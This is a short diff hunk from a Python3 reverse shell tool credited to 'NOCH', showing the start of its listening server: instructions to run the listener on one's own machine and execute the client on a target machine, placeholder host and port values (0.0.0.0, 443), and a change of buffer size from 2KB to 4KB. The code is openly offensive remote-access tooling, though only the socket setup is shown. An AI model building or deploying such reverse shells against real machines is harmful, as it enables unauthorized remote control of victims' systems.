@@ -3,14 +3,14 @@
 # Reverse Shell Written by NOCH in Python3 #
 
 # Run this listening server on your machine, then execute the client on target machine #
-# Change SERVER_HOST / SERVER_PORT accordingly #
+# Change SERVER_HOST and SERVER_PORT accordingly #
 
 import socket
 
 # Initialisation of listening IP, port and buffer size
 SERVER_HOST = "0.0.0.0" # CHANGE ME
 SERVER_PORT = 443 # CHANGE ME
-BUFFER_SIZE = 2048 # SEND 2KB at a time
+BUFFER_SIZE = 4096 # SEND 4KB at a time
 
 # Create socket object and bind it to IP and port
 server = socket.socket()
